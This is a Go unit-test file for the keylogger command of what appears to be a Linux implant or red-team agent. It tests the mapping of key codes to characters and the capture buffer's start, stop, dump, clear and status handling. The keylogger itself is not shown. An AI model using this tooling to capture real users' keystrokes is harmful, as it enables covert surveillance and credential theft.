//go:build linux

package commands

import (
	"strings"
	"testing"
	"time"

	"fawkes/pkg/structs"
)

func TestLinuxKeyToStringLetters(t *testing.T) {
	tests := []struct {
		code  uint16
		shift bool
		want  string
	}{
		{16, false, "q"}, {16, true, "Q"},
		{17, false, "w"}, {17, true, "W"},
		{18, false, "e"}, {30, false, "a"},
		{44, false, "z"}, {50, false, "m"},
		{50, true, "M"},
	}
	for _, tt := range tests {
		got := linuxKeyToString(tt.code, tt.shift)
		if got != tt.want {
			t.Errorf("linuxKeyToString(%d, shift=%v) = %q, want %q", tt.code, tt.shift, got, tt.want)
		}
	}
}

func TestLinuxKeyToStringNumbers(t *testing.T) {
	tests := []struct {
		code  uint16
		shift bool
		want  string
	}{
		{2, false, "1"}, {2, true, "!"},
		{3, false, "2"}, {3, true, "@"},
		{4, false, "3"}, {4, true, "#"},
		{5, false, "4"}, {5, true, "$"},
		{6, false, "5"}, {6, true, "%"},
		{7, false, "6"}, {7, true, "^"},
		{8, false, "7"}, {8, true, "&"},
		{9, false, "8"}, {9, true, "*"},
		{10, false, "9"}, {10, true, "("},
		{11, false, "0"}, {11, true, ")"},
	}
	for _, tt := range tests {
		got := linuxKeyToString(tt.code, tt.shift)
		if got != tt.want {
			t.Errorf("linuxKeyToString(%d, shift=%v) = %q, want %q", tt.code, tt.shift, got, tt.want)
		}
	}
}

func TestLinuxKeyToStringSpecialKeys(t *testing.T) {
	tests := []struct {
		code uint16
		want string
	}{
		{1, "[ESC]"},
		{14, "[BS]"},
		{15, "[TAB]"},
		{28, "[ENTER]\n"},
		{57, " "},
		{58, "[CAPS]"},
		{103, "[UP]"},
		{108, "[DOWN]"},
		{105, "[LEFT]"},
		{106, "[RIGHT]"},
		{111, "[DEL]"},
		{102, "[HOME]"},
		{107, "[END]"},
		{104, "[PGUP]"},
		{109, "[PGDN]"},
		{110, "[INS]"},
	}
	for _, tt := range tests {
		got := linuxKeyToString(tt.code, false)
		if got != tt.want {
			t.Errorf("linuxKeyToString(%d) = %q, want %q", tt.code, got, tt.want)
		}
	}
}

func TestLinuxKeyToStringFunctionKeys(t *testing.T) {
	tests := []struct {
		code uint16
		want string
	}{
		{59, "[F1]"}, {60, "[F2]"}, {61, "[F3]"},
		{62, "[F4]"}, {63, "[F5]"}, {64, "[F6]"},
		{65, "[F7]"}, {66, "[F8]"}, {67, "[F9]"},
		{68, "[F10]"},
		{87, "[F11]"}, {88, "[F12]"},
	}
	for _, tt := range tests {
		got := linuxKeyToString(tt.code, false)
		if got != tt.want {
			t.Errorf("linuxKeyToString(%d) = %q, want %q", tt.code, got, tt.want)
		}
	}
}

func TestLinuxKeyToStringPunctuation(t *testing.T) {
	tests := []struct {
		code  uint16
		shift bool
		want  string
	}{
		{12, false, "-"}, {12, true, "_"},
		{13, false, "="}, {13, true, "+"},
		{26, false, "["}, {26, true, "{"},
		{27, false, "]"}, {27, true, "}"},
		{39, false, ";"}, {39, true, ":"},
		{40, false, "'"}, {40, true, "\""},
		{41, false, "`"}, {41, true, "~"},
		{43, false, "\\"}, {43, true, "|"},
		{51, false, ","}, {51, true, "<"},
		{52, false, "."}, {52, true, ">"},
		{53, false, "/"}, {53, true, "?"},
	}
	for _, tt := range tests {
		got := linuxKeyToString(tt.code, tt.shift)
		if got != tt.want {
			t.Errorf("linuxKeyToString(%d, shift=%v) = %q, want %q", tt.code, tt.shift, got, tt.want)
		}
	}
}

func TestLinuxKeyToStringModifiers(t *testing.T) {
	// Modifier keys should return empty string (they're tracked, not output)
	modifiers := []uint16{29, 97, 56, 100} // CTRL_L, CTRL_R, ALT_L, ALT_R
	for _, code := range modifiers {
		got := linuxKeyToString(code, false)
		if got != "" {
			t.Errorf("linuxKeyToString(%d) = %q, want empty (modifier key)", code, got)
		}
	}

	// Meta/Super keys output [SUPER]
	for _, code := range []uint16{125, 126} {
		got := linuxKeyToString(code, false)
		if got != "[SUPER]" {
			t.Errorf("linuxKeyToString(%d) = %q, want [SUPER]", code, got)
		}
	}
}

func TestLinuxKeyToStringNumpad(t *testing.T) {
	tests := []struct {
		code uint16
		want string
	}{
		{71, "7"}, {72, "8"}, {73, "9"}, {74, "-"},
		{75, "4"}, {76, "5"}, {77, "6"}, {78, "+"},
		{79, "1"}, {80, "2"}, {81, "3"},
		{82, "0"}, {83, "."},
		{55, "*"}, {98, "/"},
		{96, "[ENTER]\n"},
	}
	for _, tt := range tests {
		got := linuxKeyToString(tt.code, false)
		if got != tt.want {
			t.Errorf("linuxKeyToString(%d) = %q, want %q", tt.code, got, tt.want)
		}
	}
}

func TestLinuxCodeToLetterComplete(t *testing.T) {
	// Verify all 26 letters are mapped
	expected := map[uint16]byte{
		16: 'q', 17: 'w', 18: 'e', 19: 'r', 20: 't',
		21: 'y', 22: 'u', 23: 'i', 24: 'o', 25: 'p',
		30: 'a', 31: 's', 32: 'd', 33: 'f', 34: 'g',
		35: 'h', 36: 'j', 37: 'k', 38: 'l',
		44: 'z', 45: 'x', 46: 'c', 47: 'v', 48: 'b',
		49: 'n', 50: 'm',
	}

	for code, want := range expected {
		got := linuxCodeToLetter(code)
		if got != want {
			t.Errorf("linuxCodeToLetter(%d) = %c, want %c", code, got, want)
		}
	}

	// Non-letter codes should return 0
	if got := linuxCodeToLetter(0); got != 0 {
		t.Errorf("linuxCodeToLetter(0) = %d, want 0", got)
	}
	if got := linuxCodeToLetter(99); got != 0 {
		t.Errorf("linuxCodeToLetter(99) = %d, want 0", got)
	}
}

func TestLinuxKeyToStringUnknownCode(t *testing.T) {
	// An unmapped code should return empty string
	got := linuxKeyToString(200, false)
	if got != "" {
		t.Errorf("linuxKeyToString(200) = %q, want empty string", got)
	}
}

// --- Keylog state management tests ---

// resetKeylogState ensures kl is in a clean stopped state for testing.
func resetKeylogState() {
	kl.mu.Lock()
	defer kl.mu.Unlock()
	kl.running = false
	kl.buffer.Reset()
	kl.keyCount = 0
	kl.shiftDown = false
	kl.stopCh = nil
}

func TestKeylogExecuteEmptyParams(t *testing.T) {
	cmd := &KeylogCommand{}
	result := cmd.Execute(structs.Task{Params: ""})
	if result.Status != "error" {
		t.Errorf("expected error for empty params, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "action required") {
		t.Errorf("expected 'action required' message, got %q", result.Output)
	}
}

func TestKeylogExecuteInvalidJSON(t *testing.T) {
	cmd := &KeylogCommand{}
	result := cmd.Execute(structs.Task{Params: "not-json"})
	if result.Status != "error" {
		t.Errorf("expected error for invalid JSON, got %q", result.Status)
	}
}

func TestKeylogExecuteUnknownAction(t *testing.T) {
	cmd := &KeylogCommand{}
	result := cmd.Execute(structs.Task{Params: `{"action":"invalid"}`})
	if result.Status != "error" {
		t.Errorf("expected error for unknown action, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "Unknown action") {
		t.Errorf("expected 'Unknown action' message, got %q", result.Output)
	}
}

func TestKeylogStopWhenNotRunning(t *testing.T) {
	resetKeylogState()
	result := keylogStop()
	if result.Status != "error" {
		t.Errorf("expected error when stopping non-running keylogger, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "not running") {
		t.Errorf("expected 'not running' message, got %q", result.Output)
	}
}

func TestKeylogDumpWhenNotRunning(t *testing.T) {
	resetKeylogState()
	result := keylogDump()
	if result.Status != "error" {
		t.Errorf("expected error when dumping non-running keylogger, got %q", result.Status)
	}
}

func TestKeylogClearWhenNotRunning(t *testing.T) {
	resetKeylogState()
	result := keylogClear()
	if result.Status != "error" {
		t.Errorf("expected error when clearing non-running keylogger, got %q", result.Status)
	}
}

func TestKeylogStatusWhenNotRunning(t *testing.T) {
	resetKeylogState()
	result := keylogStatus()
	if result.Status != "success" {
		t.Errorf("expected success, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "not running") {
		t.Errorf("expected 'not running' message, got %q", result.Output)
	}
}

func TestKeylogStatusWhenRunning(t *testing.T) {
	resetKeylogState()
	// Simulate running state
	kl.mu.Lock()
	kl.running = true
	kl.startTime = time.Now().Add(-30 * time.Second)
	kl.keyCount = 42
	kl.buffer.WriteString("test keystrokes")
	kl.stopCh = make(chan struct{})
	kl.mu.Unlock()
	defer resetKeylogState()

	result := keylogStatus()
	if result.Status != "success" {
		t.Errorf("expected success, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "running") {
		t.Errorf("expected 'running' in output, got %q", result.Output)
	}
	if !strings.Contains(result.Output, "42") {
		t.Errorf("expected keystroke count '42' in output, got %q", result.Output)
	}
}

func TestKeylogDumpWhenRunningEmpty(t *testing.T) {
	resetKeylogState()
	kl.mu.Lock()
	kl.running = true
	kl.startTime = time.Now().Add(-10 * time.Second)
	kl.keyCount = 0
	kl.stopCh = make(chan struct{})
	kl.mu.Unlock()
	defer resetKeylogState()

	result := keylogDump()
	if result.Status != "success" {
		t.Errorf("expected success, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "no keystrokes captured") {
		t.Errorf("expected 'no keystrokes' message, got %q", result.Output)
	}
}

func TestKeylogDumpWhenRunningWithData(t *testing.T) {
	resetKeylogState()
	kl.mu.Lock()
	kl.running = true
	kl.startTime = time.Now().Add(-60 * time.Second)
	kl.keyCount = 5
	kl.buffer.WriteString("hello")
	kl.stopCh = make(chan struct{})
	kl.mu.Unlock()
	defer resetKeylogState()

	result := keylogDump()
	if result.Status != "success" {
		t.Errorf("expected success, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "5 keystrokes") {
		t.Errorf("expected '5 keystrokes' in output, got %q", result.Output)
	}
	if !strings.Contains(result.Output, "hello") {
		t.Errorf("expected captured text in output, got %q", result.Output)
	}
}

func TestKeylogClearWhenRunning(t *testing.T) {
	resetKeylogState()
	kl.mu.Lock()
	kl.running = true
	kl.startTime = time.Now()
	kl.keyCount = 10
	kl.buffer.WriteString("some data")
	kl.stopCh = make(chan struct{})
	kl.mu.Unlock()
	defer resetKeylogState()

	result := keylogClear()
	if result.Status != "success" {
		t.Errorf("expected success, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "10 keystrokes removed") {
		t.Errorf("expected '10 keystrokes removed', got %q", result.Output)
	}

	// Verify buffer is cleared
	kl.mu.Lock()
	if kl.keyCount != 0 {
		t.Errorf("keyCount should be 0 after clear, got %d", kl.keyCount)
	}
	if kl.buffer.Len() != 0 {
		t.Error("buffer should be empty after clear")
	}
	if !kl.running {
		t.Error("keylogger should still be running after clear")
	}
	kl.mu.Unlock()
}

func TestKeylogStopWhenRunning(t *testing.T) {
	resetKeylogState()
	kl.mu.Lock()
	kl.running = true
	kl.startTime = time.Now().Add(-120 * time.Second)
	kl.keyCount = 25
	kl.buffer.WriteString("captured text here")
	kl.stopCh = make(chan struct{})
	kl.mu.Unlock()
	defer resetKeylogState()

	result := keylogStop()
	if result.Status != "success" {
		t.Errorf("expected success, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "Keylogger stopped") {
		t.Errorf("expected 'stopped' message, got %q", result.Output)
	}
	if !strings.Contains(result.Output, "25") {
		t.Errorf("expected keystroke count in output, got %q", result.Output)
	}
	if !strings.Contains(result.Output, "captured text here") {
		t.Errorf("expected captured text in output, got %q", result.Output)
	}

	// Verify state is cleaned up
	kl.mu.Lock()
	if kl.running {
		t.Error("keylogger should not be running after stop")
	}
	kl.mu.Unlock()
}

func TestKeylogStartAlreadyRunning(t *testing.T) {
	resetKeylogState()
	kl.mu.Lock()
	kl.running = true
	kl.stopCh = make(chan struct{})
	kl.mu.Unlock()
	defer resetKeylogState()

	result := keylogStart()
	if result.Status != "error" {
		t.Errorf("expected error for double start, got %q", result.Status)
	}
	if !strings.Contains(result.Output, "already running") {
		t.Errorf("expected 'already running' message, got %q", result.Output)
	}
}
